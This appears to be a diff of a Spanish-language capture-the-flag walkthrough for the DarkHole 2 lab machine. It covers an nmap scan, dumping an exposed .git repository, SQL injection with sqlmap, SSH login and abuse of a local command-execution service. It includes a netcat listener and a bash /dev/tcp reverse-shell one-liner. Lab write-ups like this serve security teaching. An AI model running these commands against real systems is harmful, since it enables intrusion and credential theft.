@@ -41,7 +41,9 @@ nmap -sC -sV -p- <IP-objetivo>
 ```
 
 Dos servicios y un aviso: **el script de nmap detecta un repositorio git publicado**. Ese es el
-hilo del que tira todo lo demás. ![Escaneo: dos servicios y el aviso del repositorio .git expuesto](evidencia/nmap.png)
+hilo del que tira todo lo demás.
+
+![Escaneo: dos servicios y el aviso del repositorio .git expuesto](evidencia/nmap.png)
 
 ## Enumeración: el repositorio expuesto
 
@@ -52,26 +54,39 @@ git-dumper http://<IP-objetivo>/.git/ backup
 cd backup && git log -p
 ```
 
-El historial muestra el commit que añadió el formulario de login **con credenciales por defecto
-escritas en el código**. No hay que romper nada: la llave está publicada.
-![El historial del repositorio: el commit con credenciales por defecto](evidencia/repo.png)
+El listado del directorio se sirve tal cual desde el navegador:
+
+![Listado del directorio .git publicado, con la ruta completa en la barra](evidencia/git-index.png)
+
+Y el historial muestra el commit que añadió el formulario de login **con el usuario y la contraseña
+por defecto escritos en el código**. No hay que romper nada: la llave está publicada.
+
+![git diff del commit: la comparación con el usuario y la contraseña por defecto](evidencia/git-diff-login.png)
 
 ## Acceso al panel
 
-Con esas credenciales se entra en el panel de administración. El formulario de login construye la
-consulta concatenando lo que llega, así que es inyectable.
+Con las credenciales que aparecen en la captura anterior se entra en el panel de administración. El
+formulario de login construye la consulta concatenando lo que llega, así que es inyectable.
 
 - Petición capturada con **Burp Suite** para reutilizarla.
 - Técnica: T1190 · Exploit Public-Facing Application.
 
 ## El volcado
 
+La petición se captura con Burp y se lanza con sqlmap contra la URL del panel:
+
 ```bash
-sqlmap -r peticion.txt --batch --dbs
+sudo sqlmap -u "http://<IP-objetivo>/dashboard.php?id=1" -r cookies --batch --dbs
 ```
 
+![sqlmap lanzado contra la URL del panel con la petición capturada](evidencia/sqlmap-request.png)
+
 sqlmap enumera la base `darkhole_2` y deja dos tablas interesantes: `users` (cuentas del sitio) y
-`ssh` (credenciales de acceso al sistema). ![Volcado con sqlmap: la base de datos y sus tablas](evidencia/sqlmap.png)
+`ssh` (credenciales de acceso al sistema).
+
+![Volcado de la tabla users: correo y contraseña del panel](evidencia/sqlmap-users.png)
+
+![Volcado de la tabla ssh: usuario y contraseña para entrar por SSH](evidencia/sqlmap-ssh.png)
 
 ## Acceso inicial
 
@@ -79,21 +94,27 @@ sqlmap enumera la base `darkhole_2` y deja dos tablas interesantes: `users` (cue
 ssh jehad@<IP-objetivo>
 ```
 
-La contraseña sale del volcado. Sesión en la máquina como usuario sin privilegios.
-![Enumeración con linPEAS: las pistas de su y sudo](evidencia/linpeas.png)
+La contraseña sale de la tabla `ssh` del volcado. Sesión en la máquina como usuario sin privilegios.
 
 ## Post-explotación
 
-`linPEAS` resume el sistema y da dos pistas: probar `su` con los nombres de usuario y revisar
-`sudo`. Además, encuentra un **directorio web servido en el puerto 9999** que solo escucha en local:
+`linPEAS` resume el sistema y se lee como un mapa del camino: recomienda probar `su` con los nombres
+de usuario y revisar `sudo`. Y en las tareas programadas aparece el hallazgo que cambia el ataque:
+**el usuario `losy` sirve un directorio web en el puerto 9999**, solo en local.
+
+![Cron del usuario losy: cd /opt/web && php -S localhost:9999](evidencia/linpeas-cron.png)
+
+Ese servicio ejecuta el comando que se le pasa:
 
 ```bash
 curl "http://localhost:9999/cmd?id=id"
 # Parameter GET:['cmd']uid=1002(losy) gid=1002(losy)
 ```
 
-El servicio ejecuta el comando que se le pasa y lo hace **como otro usuario**. Con una reverse
-shell se obtiene sesión interactiva:
+![curl al servicio interno: el id devuelve otro usuario](evidencia/curl9999.png)
+
+El servicio ejecuta lo que se le pasa y lo hace **como otro usuario**. Con una reverse shell se
+obtiene sesión interactiva:
 
 ```bash
 # en el atacante
@@ -102,10 +123,9 @@ nc -lvnp <puerto>
 bash -i >& /dev/tcp/<IP-atacante>/<puerto> 0>&1
 ```
 
-Dentro, la flag de usuario: `cat user.txt`.
-![curl al servicio interno: el id devuelve otro usuario](evidencia/curl9999.png)
-
 ![Payload de reverse shell generado contra la IP y el puerto del atacante](evidencia/revshellgen.png)
+
+Dentro, el usuario es `losy` y su flag está en el directorio personal:
 
 ![Sesión como losy y flag de usuario](evidencia/revshell.png)
 
